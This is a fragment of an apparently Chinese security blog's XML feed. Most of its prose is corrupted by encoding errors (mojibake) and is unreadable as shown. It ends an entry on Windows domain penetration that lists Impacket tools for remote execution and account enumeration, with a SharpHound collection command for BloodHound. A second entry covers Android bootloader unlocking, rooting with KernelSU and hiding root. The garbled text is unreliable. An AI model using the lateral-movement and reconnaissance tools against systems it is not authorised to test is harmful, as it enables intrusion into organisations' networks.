æ•°æ®åŒ…æ£€æŸ¥ä¸»æœºçŠ¶æ€</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ping.py <span class="token operator">&lt;</span>src ip<span class="token operator">></span> <span class="token operator">&lt;</span>dst ip<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>lookupsid.pyï¼šé€šè¿‡ [MS-LSAT] MSRPC æ¥å£çš„ Windows SID bruteforcer ç¤ºä¾‹ï¼Œæ—¨åœ¨æŸ¥æ‰¾è¿œç¨‹ç”¨æˆ·&#x2F;ç»„</li><li>psexec.pyï¼šåœ¨è¿œç¨‹ Windows ç³»ç»Ÿä¸Šæ‰§è¡Œè¿›ç¨‹ï¼Œå¤åˆ¶æ–‡ä»¶ï¼Œå¹¶è¿”å›å¤„ç†è¾“å‡ºç»“æœã€‚æ­¤å¤–ï¼Œå®ƒè¿˜å…è®¸ä½ ç›´æ¥ä½¿ç”¨å®Œæ•´çš„äº¤äº’å¼æ§åˆ¶å°æ‰§è¡Œè¿œç¨‹ shell å‘½ä»¤ï¼ˆä¸éœ€è¦å®‰è£…ä»»ä½•å®¢æˆ·ç«¯è½¯ä»¶ï¼‰</li><li>smbexec.pyï¼šä¸ psexec ç›¸ä¼¼ï¼Œä½†æ˜¯ä¸ä¼šå°†äºŒè¿›åˆ¶æ–‡ä»¶æ”¾å…¥ç£ç›˜ï¼Œsmbexec åˆ©ç”¨ä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶å’Œä¸€ä¸ªä¸´æ—¶æ–‡ä»¶æ¥æ‰§è¡Œå’Œè½¬å‘æ¶ˆæ¯ã€‚ä¸ psexec ä¸€æ ·ï¼Œsmbexec é€šè¿‡ SMB åè®® (445&#x2F;TCP) å‘é€è¾“å…¥å¹¶æ¥æ”¶è¾“å‡ºã€‚</li><li>rpcdump.pyï¼šè½¬å‚¨åœ¨ç›®æ ‡ä¸Šæ³¨å†Œçš„RPCç«¯ç‚¹å’Œå­—ç¬¦ä¸²bindingsåˆ—è¡¨ã€‚å®ƒä¹Ÿä¼šå°è¯•å°†å®ƒä»¬ä¸ä¸€äº›çŸ¥åçš„ç«¯ç‚¹è¿›è¡ŒåŒ¹é…</li><li>samrdump.pyï¼šä¸ MSRPC å¥—ä»¶ä¸­çš„å®‰å…¨å¸æˆ·ç®¡ç†å™¨è¿œç¨‹æ¥å£é€šä¿¡çš„åº”ç”¨ç¨‹åºã€‚å®ƒå°†ä¸ºæˆ‘ä»¬åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šçš„ç”¨æˆ·å¸æˆ·ï¼Œå¯ç”¨èµ„æºå…±äº«ä»¥åŠé€šè¿‡æ­¤æœåŠ¡å¯¼å‡ºçš„å…¶ä»–æ•æ„Ÿä¿¡æ¯</li><li>sniff.pyï¼šä¸€ä¸ªç®€å•çš„æ•°æ®åŒ…å—…æ¢è„šæœ¬ã€‚ä½¿ç”¨ pcapy åº“æ¥ä¾¦å¬é€šè¿‡æŒ‡å®šæ¥å£ä¼ è¾“çš„æ•°æ®åŒ…</li><li>sniffer.pyï¼šä¸€ä¸ªç®€å•çš„æ•°æ®åŒ…å—…æ¢è„šæœ¬ï¼Œä½¿ç”¨åŸå§‹å¥—æ¥å­—æ¥ä¾¦å¬ä¸æŒ‡å®šåè®®ç›¸å¯¹åº”çš„ä¼ è¾“æ•°æ®åŒ…</li><li>wmiexec.pyï¼šç”Ÿæˆä¸€ä¸ªä½¿ç”¨ Windows Management Instrumentation çš„åŠäº¤äº’å¼shellï¼Œå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œã€‚ä½ ä¸éœ€è¦åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå®‰è£…ä»»ä½•çš„æœåŠ¡&#x2F;ä»£ç†ï¼Œå› æ­¤å®ƒéå¸¸çš„éšè”½ã€‚</li><li>wmiquery.pyï¼šå‘å‡ºWQLæŸ¥è¯¢å¹¶è·å–ç›®æ ‡ç³»ç»ŸWMIå¯¹è±¡çš„æè¿°ä¿¡æ¯</li><li>atexec.pyï¼šé€šè¿‡Task ScheduleræœåŠ¡åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶è¿”å›è¾“å‡ºç»“æœ</li><li>getArch.pyï¼šè¯¥è„šæœ¬å°†è¿æ¥ç›®æ ‡ï¼ˆæˆ–ç›®æ ‡åˆ—è¡¨ä¸Šçš„ï¼‰è®¡ç®—æœºï¼Œå¹¶ä½¿ç”¨å·²è®°å½•çš„ MSRPC ç‰¹å¾æ”¶é›†ç”±ï¼ˆabï¼‰å®‰è£…çš„æ“ä½œç³»ç»Ÿæ¶æ„ç±»å‹ã€‚</li><li>ifmap.pyï¼šè¯¥è„šæœ¬å°†ç»‘å®šåˆ°ç›®æ ‡çš„ MGMT æ¥å£ï¼Œä»¥è·å–æ¥å£ ID åˆ—è¡¨ã€‚å®ƒå°†åœ¨å¦ä¸€ä¸ªæ¥å£ UUID åˆ—è¡¨çš„é¡¶éƒ¨ä½¿ç”¨è¯¥åˆ—è¡¨ï¼Œå¹¶æŠ¥å‘Šè¯¥æ¥å£æ˜¯å¦è¢«åˆ—å‡ºå’Œ&#x2F;æˆ–å¤„äºä¾¦å¬çŠ¶æ€</li></ul><hr><h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>è‡ªåŠ¨åŒ–åˆ†æåŸŸç¯å¢ƒï¼Œå¯ä»¥æ­ç¤ºå¹¶åˆ†æåŸŸç¯å¢ƒä¸­å„å¯¹è±¡ä¹‹é—´çš„å…³ç³»ï¼Œå»ºè®®ä½¿ç”¨ docker å®‰è£…</p><p>åŸºäº neo4j æ•°æ®åº“</p><p>é¦–å…ˆä¼  SharpHound æ•°æ®é‡‡é›†å™¨åˆ°ç›®æ ‡æœºå™¨ä¸Šï¼Œé‡‡é›†å¹¶å¯¼å‡ºæ•°æ®</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">SharpHound<span class="token punctuation">.</span>exe <span class="token operator">-</span>c All<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SharpHound ä¼šè‡ªåŠ¨é‡‡é›†åŸŸå†…çš„ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€ç»„ç­–ç•¥ã€åŸŸä¿¡ä»»å…³ç³»ç­‰ä¿¡æ¯ï¼Œç„¶åä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª zip æ–‡ä»¶</p><hr><h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><p>å‚è€ƒï¼š <a href="https://www.cnblogs.com/kqdssheng/p/18857416#id4">https://www.cnblogs.com/kqdssheng/p/18857416#id4</a></p><hr><h2 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h2><p>å‚è€ƒï¼š <a href="http://nooemotion.com/2023/02/20/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-adfind/">http://nooemotion.com/2023/02/20/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-adfind/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1624522&quot;&gt;https://cloud.tencent.com/developer/article/1624522&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/272298.html&quot;&gt;https://www.freebuf.com/articles/system/272298.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_28205153/article/details/113827476&quot;&gt;https://blog.csdn.net/qq_28205153/article/details/113827476&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/sectool/360319.html&quot;&gt;https://www.freebuf.com/sectool/360319.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/-mo-/p/11890232.html&quot;&gt;https://www.cnblogs.com/-mo-/p/11890232.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_42077227/article/details/130279040&quot;&gt;https://blog.csdn.net/qq_42077227/article/details/130279040&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/websecyw/p/15964217.html&quot;&gt;https://www.cnblogs.com/websecyw/p/15964217.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C&quot;&gt;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ã€Šå†…ç½‘æ¸—é€ä½“ç³»å»ºè®¾ã€‹ Nu1L Team&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Androidç©æœºå°è®°</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/08/29/Android%E7%8E%A9%E6%9C%BA%E5%B0%8F%E8%AE%B0/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/08/29/Android%E7%8E%A9%E6%9C%BA%E5%B0%8F%E8%AE%B0/</id>
    <published>2025-08-28T16:53:26.000Z</published>
    <updated>2026-01-12T08:42:52.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>broåŸå…ˆçš„äºŒæ‰‹çº¢ç±³ç”¨äº†ä¸‰å¹´ä¸»æ¿çƒ§äº†ï¼Œç´¢æ€§æ¢äº†å°èƒ½ç›´æ¥è§£ bl çš„ä¸€åŠ  ace5proï¼Œå°±è¿™æ ·ï¼Œä»è§£ bl å…¥é—¨åˆ°å˜ç –é€Ÿé€šï¼ˆbushiï¼‰</p><span id="more"></span><h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><p>æå®¢æ¹¾çš„è§†é¢‘ï¼š<a href="https://b23.tv/ZICfxba">ç©æœºå¿…çœ‹ï¼å¸¦ä½ å…¥å‘å®‰å“åˆ·æœºï¼Œå°ç™½ä¹Ÿèƒ½çœ‹æ‡‚çš„ ROOT åŸºç¡€æŒ‡å—æ¥å•¦ï¼-å“”å“©å“”å“©</a></p><p><a href="https://doraemon.xlog.app/Android-wan-ji-ji-chu-zhi-shi-md?locale=zh">https://doraemon.xlog.app/Android-wan-ji-ji-chu-zhi-shi-md?locale=zh</a></p><h2 id="å®‰å“åˆ†åŒº"><a href="#å®‰å“åˆ†åŒº" class="headerlink" title="å®‰å“åˆ†åŒº"></a>å®‰å“åˆ†åŒº</h2><p>Boot åˆ†åŒºï¼š</p><ul><li>å­˜æ”¾æœ‰å¯åŠ¨å’Œå¼•å¯¼çš„æ–‡ä»¶ï¼Œä¸å¼€æœºå¯åŠ¨å¼•å¯¼ç›¸å…³</li><li>åŒ…å«äº†æ“ä½œç³»ç»Ÿçš„Â <strong>Kernel (å†…æ ¸)</strong>Â ä¸Â <strong>Ramdisk (è™šæ‹Ÿå†…å­˜)</strong>    </li><li>Root æ“ä½œå°±æ˜¯ä¿®æ”¹åœ¨ boot åˆ†åŒº</li><li>å¦‚æœ boot åˆ†åŒºè¢«æ“¦é™¤æˆ–è€…æŸåï¼Œæ‰‹æœºå°±ä¼šå¡åœ¨å¼€æœºçš„ç¬¬ä¸€å±ï¼ˆbootloader é˜¶æ®µï¼Œæ˜¾ç¤ºå¦‚æ‰‹æœºåˆ¶é€ å•†çš„ logoï¼‰</li></ul><p>System åˆ†åŒºï¼š</p><ul><li>å­˜æ”¾å®‰å“ç³»ç»Ÿå’Œç³»ç»Ÿåº”ç”¨</li><li>ç³»ç»Ÿåˆ†åŒºåŒ…å«äº†æ•´ä¸ª<strong>æ“ä½œç³»ç»Ÿ</strong>ä¸<strong>ç³»ç»Ÿè½¯ä»¶</strong></li><li>ç³»ç»Ÿå‡çº§æˆ–è€…åˆ·æœºå¾ˆå¤šæ—¶å€™éƒ½æ˜¯åœ¨æ“ä½œè¿™ä¸ªåˆ†åŒº</li><li>system åˆ†åŒºæŸåä¼šå¡åœ¨å¼€æœºçš„ç¬¬äºŒå±ï¼ˆkernel é˜¶æ®µï¼Œæ˜¾ç¤ºå¦‚è®¾å¤‡ logo æˆ–ä¸å†…æ ¸ç›¸å…³çš„ç”»é¢ï¼‰</li></ul><p>Vendor åˆ†åŒºï¼š</p><p>ä¸ system åˆ†åŒºç›¸ä¼¼çš„è¿˜æœ‰ä¸€ä¸ª Vendor åˆ†åŒºã€‚</p><ul><li>å®ƒåŒ…å«äº†å¼€å‘å‚å•†<strong>å®šåˆ¶çš„ä¸€äº›åº”ç”¨ä¸åº“æ–‡ä»¶</strong></li><li>å¾ˆå¤šå‚å•†ä¹Ÿä¼šç›´æ¥æŠŠ Vendor åˆ†åŒºè¿™äº›æ–‡ä»¶æ”¾è¿› system åˆ†åŒºé‡Œé¢ï¼Œæ–¹ä¾¿åæœŸçš„æ›´æ–°å’Œç»´æŠ¤</li></ul><p>Data åˆ†åŒºï¼š</p><ul><li>æ•°æ®åˆ†åŒºå­˜æ”¾ç”¨æˆ·æ•°æ®ï¼ŒåŒ…æ‹¬åº”ç”¨ã€éŸ³è§†é¢‘ã€å›¾ç‰‡ã€ç³»ç»Ÿè®¾ç½®ç­‰</li><li>æ“¦é™¤ data åˆ†åŒºä¼šæ¸…ç©ºç”¨æˆ·æ•°æ®ï¼Œä½†ä¸ä¼šå½±å“åˆ°æ‰‹æœºçš„æ­£å¸¸å¯åŠ¨</li></ul><p>Cache åˆ†åŒºï¼š</p><ul><li>å®‰å“çš„ç¼“å­˜åŒº</li><li>ç¼“å­˜å¯ä»¥å¸®åŠ©ä½ å¿«é€Ÿçš„æ‰“å¼€ç³»ç»Ÿæœ€å¸¸è®¿é—®çš„æ•°æ®å’Œåº”ç”¨ç¨‹åºï¼Œä¸éœ€è¦é‡å¤åŠ è½½</li><li>æ“¦é™¤ç¼“å­˜å¹¶ä¸ä¼šå½±å“ä¸ªäººæ•°æ®ï¼Œåç»­ä½¿ç”¨è¿˜æ˜¯ä¼šè‡ªåŠ¨ç”Ÿæˆ</li></ul><p>Recovery åˆ†åŒºï¼š</p><ul><li>æ¢å¤åˆ†åŒºåŒ…å«ä¸€ä¸ªç®€æ˜“ Linux ç³»ç»Ÿç”¨äºæ¢å¤å’Œç»´æŠ¤æ‰‹æœº</li><li>å¯ä»¥ç”¨æ¥æ¢å¤å’Œæ›´æ–°å…¶ä»–åˆ†åŒºçš„å†…å®¹ (å¦‚æ“¦é™¤æ•°æ®)ï¼Œç±»ä¼¼äº Windows PE (Pre-installing environment)</li></ul><p>AB åˆ†åŒºï¼š</p><p>è¿‘å¹´æ¥å‡ºç°äº†è¶Šæ¥è¶Šå¤šä¸å­˜åœ¨ recovery åˆ†åŒºçš„æ‰‹æœºï¼Œè¿™æ˜¯å› ä¸ºå®‰å“ä» 7.0 å¼€å§‹å¼•å…¥äº†æ–°çš„ OTA å‡çº§æ–¹å¼ï¼Œ<strong>A&#x2F;B System Updatesï¼ˆAB åˆ†åŒºï¼‰</strong></p><p>è¿™ç§å‡çº§æ–¹å¼æŠŠ boot å’Œ system åˆ†åŒºè®¾ç½®äº†ä¸¤å¥—ï¼ŒSlotA å’Œ SlotB ï¼Œå¹³æ—¶ç”¨çš„ Slot æ˜¯ä¸»åˆ†åŒºï¼Œå¦ä¸€ä¸ª Slot æ˜¯å¤‡ç”¨åˆ†åŒº</p><p>è¿™æ ·åœ¨ç³»ç»Ÿå‡çº§çš„æ—¶å€™å¯ä»¥åšåˆ°æ— ç¼å‡çº§ï¼Œç”¨æˆ·å¯ä»¥è¾¹ç”¨æ‰‹æœºåå°è¾¹å‡çº§ç³»ç»Ÿ (æ›´æ–°å¤‡ä»½åˆ†åŒºçš„å†…å®¹)ï¼Œå‡çº§å®Œæˆä¹‹åé‡å¯æ‰‹æœºï¼Œå¤‡ä»½åˆ†åŒºå°±ä¼šè‡ªåŠ¨åˆ‡æ¢æˆä¸»åˆ†åŒºï¼Œè‹¥å‡çº§å¤±è´¥ç³»ç»Ÿæ— æ³•å¯åŠ¨æ˜¯å°±ä¼šåˆ‡å›ä¹‹å‰çš„åˆ†åŒºï¼Œç¼ºç‚¹å°±æ˜¯ä¼šå ç”¨åŒå€çš„ system ç©ºé—´ã€‚</p><p><img src="/blog/2025/08/29/Android%E7%8E%A9%E6%9C%BA%E5%B0%8F%E8%AE%B0/IMG-20250901095820898.png"></p><p>VA&#x2F;B åˆ†åŒºï¼š</p><p>ä¸ºäº†è§£å†³ç©ºé—´å ç”¨çš„é—®é¢˜ï¼Œäºæ˜¯åˆå‡ºç°äº† AB åˆ†åŒºçš„æ”¹è¿›ç‰ˆ OTA å‡çº§æ–¹å¼ï¼ŒÂ <strong>Virtual A&#x2F;B System Updates</strong>Â ï¼ˆVA&#x2F;B åˆ†åŒºï¼‰ï¼š<strong>ä¸¤ä»£ç³»ç»Ÿï¼Œç›¸åŒæ–‡ä»¶å…±ç”¨ï¼Œä¸åŒæ–‡ä»¶å­˜äºè™šæ‹Ÿ A&#x2F;B åˆ†åŒº</strong></p><p>ç›®å‰å‡ºå‚æ­è½½å®‰å“ 11 ä»¥ä¸Šçš„æœºå‹æ™®éé‡‡ç”¨äº† VA&#x2F;B åˆ†åŒº</p><p>ä»ç©æœºçš„è§’åº¦æ¥è®² A&#x2F;B æˆ–è€… VA&#x2F;B åˆ†åŒºåˆ·ç¬¬ä¸‰æ–¹ recovery ä¼šæ¯”è¾ƒéº»çƒ¦ä¸€ç‚¹ï¼Œå› ä¸ºè¿™ä¸¤ç§åˆ†åŒºéƒ½æŠŠ recovery åˆ†åŒºå¹¶å…¥äº† boot åˆ†åŒº</p><p><img src="/blog/2025/08/29/Android%E7%8E%A9%E6%9C%BA%E5%B0%8F%E8%AE%B0/IMG-20250901100139503.png"></p><h2 id="Bootloader"><a href="#Bootloader" class="headerlink" title="Bootloader"></a>Bootloader</h2><p>å–œé—»ä¹è§çš„ bl ç¯èŠ‚</p><ul><li>å¦‚æœæŠŠ recovery æ¯”ä½œ PEï¼Œ<strong>fastboot é˜¶æ®µæ‰€å±çš„ bootloader å°±ç›¸å½“äºç”µè„‘ä¸Šçš„ BIOS&#x2F;UEFI</strong>ã€‚</li><li>bootloader é¡¾åæ€ä¹‰å°±æ˜¯Â **å¼•å¯¼ (boot) åŠ è½½å™¨ (loader)**ï¼Œé•¿æŒ‰ç”µæºé”®å¼€æœºçš„é‚£ä¸€åˆ»èµ·ï¼Œbootloader å°±å·²ç»å¼€å§‹å·¥ä½œäº†ã€‚</li><li>åœ¨è¿™æ®µæ—¶é—´é‡Œ **bootloader ä¼šåˆå§‹åŒ–æ‰‹æœºé‡Œçš„ç¡¬ä»¶è®¾å¤‡ï¼Œå¼•å¯¼æ“ä½œç³»ç»Ÿå†…æ ¸ (boot åˆ†åŒºé‡Œçš„ Kernel)**ã€‚</li><li>åœ¨å¼•å¯¼åæœŸ<strong>æˆ‘ä»¬å¯ä»¥é€‰æ‹©è¿›å…¥ä¸€ä¸ªå« fastboot çš„é˜¶æ®µ (æ‰‹æœºä¸Šä¸€èˆ¬é•¿æŒ‰ç”µæº + éŸ³é‡å‡é”®è¿›å…¥)<strong>ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„</strong>åˆ·æœºæ¨¡å¼</strong>ã€‚</li><li>fastboot æ¯” recovery æ›´åŠ åº•å±‚ï¼Œfastboot ä¸‹å¯ä»¥æŠŠæ‰‹æœºè¿æ¥ç”µè„‘ï¼Œè¾“å…¥å‘½ä»¤æ¥ç›´æ¥åˆ·æœºã€‚</li><li>è§£é”æ‰‹æœºï¼Œæ³¨å…¥ boot é•œåƒï¼Œçº¿åˆ·ç³»ç»Ÿç­‰å¾ˆå¤šæ“ä½œéƒ½è¦é€šè¿‡ fastboot æ¥è¿›è¡Œã€‚</li><li><strong>bootloader å¹¶ä¸å±äºæŸä¸ªç³»ç»Ÿåˆ†åŒºï¼Œå¦‚æœç³»ç»ŸæŸä¸ªåˆ†åŒºæŸåå¯¼è‡´æ‰‹æœºå˜ç –ï¼Œä¸€èˆ¬å¯ä»¥è¿›å…¥ fastboot æ•‘ç –</strong></li><li><strong>ä½¿ç”¨ fastboot åˆ·æœºä¸€èˆ¬ç§°ä¸ºçº¿åˆ·ï¼ˆæ•°æ®çº¿è¿æ¥ç”µè„‘ï¼‰ï¼Œä½¿ç”¨ recovery åˆ·æœºä¸€èˆ¬ç§°ä¸ºå¡åˆ· (å¡åˆ·åŒ…ä¸‹è½½åˆ°æ‰‹æœº)</strong></li></ul><p>è§£ bl å‰éœ€è¦é€€å‡ºè°·æ­Œè´¦å·</p><hr><h2 id="kernelSU"><a href="#kernelSU" class="headerlink" title="kernelSU"></a>kernelSU</h2><p><a href="https://kernelsu.com/">https://kernelsu.com/</a></p><p><a href="https://www.daowuya.love/2024%E5%B0%8F%E7%B1%B3%E7%B3%BB%E5%88%97%E7%BA%AF%E5%B0%8F%E7%99%BD%E5%85%A8%E5%A5%97%E5%88%B7%E6%9C%BA%E6%95%99%E7%A8%8B%EF%BC%8Cmagiskkernelsulsposed%EF%BC%8C%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4/">https://www.daowuya.love/2024%E5%B0%8F%E7%B1%B3%E7%B3%BB%E5%88%97%E7%BA%AF%E5%B0%8F%E7%99%BD%E5%85%A8%E5%A5%97%E5%88%B7%E6%9C%BA%E6%95%99%E7%A8%8B%EF%BC%8Cmagiskkernelsulsposed%EF%BC%8C%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4/</a></p><hr><h2 id="Android-å‡­æ®å­˜å‚¨"><a href="#Android-å‡­æ®å­˜å‚¨" class="headerlink" title="Android å‡­æ®å­˜å‚¨"></a>Android å‡­æ®å­˜å‚¨</h2><p>Android æŠŠè¯ä¹¦å­˜æ”¾åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š</p><ul><li>**ç³»ç»Ÿè¯ä¹¦å­˜å‚¨ (System Store)**ï¼šå­˜æ”¾åœ¨Â &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacertsã€‚è¿™æ˜¯å‡ºå‚è‡ªå¸¦çš„ï¼Œåªæœ‰ Root æƒé™æ‰èƒ½å†™å…¥ã€‚</li><li>**ç”¨æˆ·è¯ä¹¦å­˜å‚¨ (User Store)**ï¼šç”¨æˆ·åœ¨â€œè®¾ç½® -&gt; å®‰å…¨ -&gt; åŠ å¯†ä¸å‡­æ® -&gt; å®‰è£…è¯ä¹¦â€é‡Œæ‰‹åŠ¨å®‰è£…çš„ã€‚</li></ul><p><strong>Android 6.0 åŠä»¥å‰</strong>ï¼šApp é»˜è®¤ä¿¡ä»»â€œç³»ç»Ÿè¯ä¹¦â€å’Œâ€œç”¨æˆ·è¯ä¹¦â€ã€‚åªè¦æ‰‹åŠ¨è£…ä¸ª Fiddler è¯ä¹¦ï¼Œå°±èƒ½æŠ“ App çš„åŒ…ã€‚<br><strong>Android 7.0 åŠä»¥å</strong>ï¼šè°·æ­Œä¿®æ”¹äº†å®‰å…¨ç­–ç•¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>App åªä¿¡ä»»ç³»ç»Ÿè¯ä¹¦ï¼Œä¸ä¿¡ä»»ç”¨æˆ·æ‰‹åŠ¨å®‰è£…çš„è¯ä¹¦</strong>ã€‚</p><hr><h1 id="ä¸€åŠ "><a href="#ä¸€åŠ " class="headerlink" title="ä¸€åŠ "></a>ä¸€åŠ </h1><h2 id="ColorOS"><a href="#ColorOS" class="headerlink" title="ColorOS"></a>ColorOS</h2><p>å…¶å®å½“æ—¶é€‰å‹å·çš„æ—¶å€™ä¸åº”è¯¥é€‰ ace5pro çš„ï¼Œæ‰€è°“è§£ bl ä¼šç‚¸ tee æ˜¯é«˜é€šå¤„ç†å™¨çš„ç‰¹æ€§ï¼ˆå°ç±³é­”æ”¹è¿‡æ‰€ä»¥ä¸ä¼šç‚¸ï¼‰ï¼Œæ¢å…¶ä»–å‹å·æ¯”å¦‚è”å‘ç§‘å¤„ç†å™¨å°±æ²¡è¿™ä¸ªäº‹äº†ï¼Œå¥½åœ¨æˆ‘å¹³æ—¶ä¹Ÿå‡ ä¹ä¸ç”¨æŒ‡çº¹æ”¯ä»˜ï¼ˆ</p><h2 id="su-ç®¡ç†å™¨"><a href="#su-ç®¡ç†å™¨" class="headerlink" title="su ç®¡ç†å™¨"></a>su ç®¡ç†å™¨</h2><p>è¿™é‡Œé€‰æ‹© kernelSU Next</p><h2 id="éšè—-root"><a href="#éšè—-root" class="headerlink" title="éšè— root"></a>éšè— root</h2><h3 id="Zygisk-Next"><a href="#Zygisk-Next" class="headerlink" title="Zygisk Next"></a>Zygisk Next</h3><h3 id="Shamiko"><a href="#Shamiko" class="headerlink" title="Shamiko"></a>Shamiko</h3><h3 id="tricky-store"><a href="#tricky-store" class="headerlink" title="tricky store"></a>tricky store</h3><hr><h1 id="å°ç±³ï¼ˆMIUIï¼‰"><a href="#å°ç±³ï¼ˆMIUIï¼‰" class="headerlink" title="å°ç±³ï¼ˆMIUIï¼‰"></a>å°ç±³ï¼ˆMIUIï¼‰</h1><p>è®¾å¤‡ï¼šMiPad 6 pro</p><p>çªç„¶æƒ³èµ·æ¥è‡ªå·±çš„ MiPad 6 pro MIUI 14 å½“å¹´ç»‘å®šè´¦å·ä¹‹åç­‰äº†ä¸ƒå¤©ä¹‹åå°±æ²¡ç®¡äº†ï¼Œæœ€è¿‘ä¸€æ—¶å…´èµ·å‘ç°å¥½åƒä¾æ—§ä¿æŒç»‘å®šçŠ¶æ€ï¼Œå¹¶ä¸”å¯ä»¥è§£é” oemï¼Œé‚åšå®Œå¤‡ä»½ç›´æ¥è§£äº† bl</p><p><a href="https://blog.isteed.cc/post/xiaomi-13-root-guide/">https://blog.isteed.cc/post/xiaomi-13-root-guide/</a></p><p><del>ï¼ˆå‚è€ƒæ–‡ç« çš„ä½œè€…æ²¡æƒ³åˆ°åœ¨å‡ ä¸ªæœˆåå‡ºç°äº†å”®åé™çº§è·‘è·¯æ³•ï¼‰</del></p><h2 id="éŸ³æ¸¸ä¼˜åŒ–ï¼ˆæ— -rootï¼‰"><a href="#éŸ³æ¸¸ä¼˜åŒ–ï¼ˆæ— -rootï¼‰" class="headerlink" title="éŸ³æ¸¸ä¼˜åŒ–ï¼ˆæ—  rootï¼‰"></a>éŸ³æ¸¸ä¼˜åŒ–ï¼ˆæ—  rootï¼‰</h2><ul><li>å±å¹•åˆ·æ–°ç‡è‡ªå®šä¹‰ 144 hzï¼Œå¯¹äº pjsk çš„è¯éœ€è¦ä½¿ç”¨ç©æœºå·¥å…·ç®±å¼ºå¼€ 120 hz</li><li>å£°éŸ³-éŸ³è´¨éŸ³æ•ˆï¼šå…³é—­</li><li>æ‰‹åŠ¿ï¼šç³»ç»Ÿå¯¼èˆªæ–¹å¼é€‰æ‹©ç»å…¸ä¸‰å¤§é‡‘åˆš</li><li>è‡ªåŠ¨è®¾ç½®æ—¶é—´ï¼šå…³é—­</li><li>ä¼ é€é—¨ï¼šå…³é—­</li><li>æ¸¸æˆåŠ é€Ÿ</li></ul><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>è¿™é‡Œç›´æ¥é€‰æ‹© kernelSUï¼Œæå– boot.imgï¼Œæœ‰æ‰“åŒ…å¥½çš„</p><p><img src="/blog/2025/08/29/Android%E7%8E%A9%E6%9C%BA%E5%B0%8F%E8%AE%B0/IMG-20250902011619964.png"></p><h2 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h2><ul><li>zygisk next</li><li>shamiko</li></ul><h2 id="LSP"><a href="#LSP" class="headerlink" title="LSP"></a>LSP</h2><h3 id="HyperCeiler"><a href="#HyperCeiler" class="headerlink" title="HyperCeiler"></a>HyperCeiler</h3><p><a href="https://p.codekk.com/detail/Android/ReChronoRain/HyperCeiler">https://p.codekk.com/detail/Android/ReChronoRain/HyperCeiler</a></p><p>ç±»ä¼¼ä¸€åŠ çš„ lucky tools</p>]]></content>
    
    
